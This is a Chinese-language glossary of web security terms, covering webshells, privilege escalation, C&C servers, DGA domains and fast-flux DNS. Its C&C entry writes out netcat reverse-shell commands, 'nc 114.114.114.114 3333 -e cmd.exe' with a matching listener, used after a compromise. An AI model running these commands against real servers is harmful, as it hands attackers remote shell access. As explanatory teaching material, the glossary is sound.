Web 安全术语
================================

后门
--------------------------------
绕过安全控制而获取对程序或系统访问权的方法。后门的最主要目的就是方便以后再次秘密进入或者控制系统。

Webshell
--------------------------------
Webshell 就是以 asp、php、jsp 或者 cgi 等网页文件形式存在的一种命令执行环境，也可以将其称作为一种网页后门。

0day漏洞
--------------------------------
通常是指还没有补丁的漏洞。也就是说官方还没有发现或者是发现了还没有开发出安全补丁的漏洞。

Exploit
--------------------------------
简称 exp，漏洞利用。

提权
--------------------------------
提高自己在服务器中的权限，主要针对网站入侵过程中，当入侵某一网站时，通过各种漏洞提升 Webshell 权限以夺得该服务器权限。

跳板
--------------------------------
跳板，简单来说，就是在进行攻击或渗透时，不直接发起，而是控制一台中间主机来进行。这台中间主机就成为跳板。

拖库
--------------------------------
网站遭到入侵后，黑客窃取其数据库。

社会工程学
--------------------------------
一种通过对受害者心理弱点、本能反应、好奇心、信任、贪婪等心理陷阱进行诸如欺骗、伤害等危害手段取得自身利益的手法，已成迅速上升甚至滥用的趋势。

Apt 攻击
--------------------------------
高级持续性威胁。 利用先进的攻击手段对特定目标进行长期持续性网络攻击的攻击形式。

CC 
--------------------------------
CC = Challenge Collapsar，意为“挑战黑洞”，其前身名为Fatboy攻击，是利用不断对网站发送连接请求致使形成拒绝服务的目的。

C&C
--------------------------------
C&C服务器全称是 Command and Control Server，翻译过来就是命令和控制服务器.通常在做渗透测试的时候，在拿到一个 webshell的时候，需要对服务器进行提权操作，如果是一台 windows 的服务器，提权的时候通常是利用本地提权漏洞的 exp 进行溢出提权，有些 exp 可以直接在后面加参数，溢出成功之后执行参数中的命令。而有的 exp溢出成功之后是返回一个 system 权限的 cmd，这时就需要将低权限的 cmd shell 反弹回本地，这里用 nc 在本地执行：nc -vv -lp 3333.上述命令的意思是在本地监听一个 3333 端口等待连接，假设电脑 IP 是公网的，并且 IP 为 114.114.114.114，然后在目标服务器就可以执行：nc 114.114.114.114 3333 -e cmd.exe.
上面的命令就可以把远程服务器的服务器权限的 cmd shell 返回到本地，这时你就可以通过 nc 建立的这个 shell 进行通信，发送你要执行的命令，在远程服务器接收到命令之后执行并将结果返回，这时本机电脑就是一个简易的 C&C 服务器。

DGA
---------------------------------
DGA域名生成算法经常被用作恶意软件连接C2中控。在早期的僵尸网络中，控制者通常会把C&C服务器的域名或者IP地址硬编码到恶意程序中，僵尸主机通过这些信息定时访问C&C主机获取命令。但同时安全人员也能够通过逆向恶意程序，得到C&C服务器的域名或者IP，利用这些信息定位C&C主机，安全人员就可以隔断C&C主机从而破坏僵尸网络。恶意软件定期使用DGA算法生成为随机域名，有效绕过黑名单检测，尝试连接，寻找C2中控。如果一个生成的域名无法连接，便生成下一个DGA为随机域名进行连接尝试。IP被阻断C2换一个域名可以继续操作。大多数dga域名在互联网环境是访问不到的，为什么？因为没有注册，黑客可以在软件中会写多个dga域名，在确认使用攻击时注册若干个，然后中招的机器接入互联网就可以与dga域名进行通信了。

Fast-flux
---------------------------------
在正常的DNS服务器中，用户对同一个域名做DNS查询，在较长的一段时间内，无论查询多少次返回的结果基本上是不会改变的。Fast-flux技术是指不断改变域名和IP地址映射关系的一种技术，也就是说在短时间内查询使用Fast-flux技术部署的域名，会得到不同的结果.
 | 客户端两次访问www.example.com的过程如下：
 | 1)为了得到网站www.example.com的IP地址，客户端发起DNS查询。
 | 2)随后DNS服务器返回了一个IP地址1.2.3.4，同时TTL为一个很小的数值。
 | 3)客户端访问IP为1.2.3.4的服务器获取内容。
 | 4)IP为1.2.3.4的服务器响应请求，返回相应内容。
 | 5)客户端再次访问www.example.com，由于TTL过小，本地缓存的DNS记录失效，客户端需要再次向DNS服务器获取新的IP地址。
 | 6)此次DNS服务器返回了IP 4.3.2.1，这次的TTL仍然很小。
 | 7)客户端访问IP为4.3.2.1的服务器获取内容。
 | 8)IP为4.3.2.1的服务器响应请求，返回相应内容。